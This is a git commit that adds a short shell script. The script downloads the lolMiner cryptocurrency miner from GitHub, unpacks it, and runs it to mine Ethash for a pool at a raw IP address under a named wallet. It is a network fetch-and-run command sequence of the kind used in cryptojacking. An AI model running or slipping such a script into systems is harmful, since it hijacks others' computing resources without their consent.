a48293c92366d58c92c2e1f1cf52e89769fa4a96
jinxy88 <jinxy1988@gmail.com>
2022-01-11 12:03:49 +0200

    Create bash2.sh

---
+++ bash2.sh
@@ -0,0 +1,5 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
+tar -zxvf lolMiner_v1.42_Lin64.tar.gz
+ls
+cd 1.42
+./lolMiner --algo ETHASH --pool 46.101.75.232:3333 --user ELON:0xa4a231fBF53800d2208E824428f18CaAFbaAC4A9.rob3 --ethstratum ETHPROXY
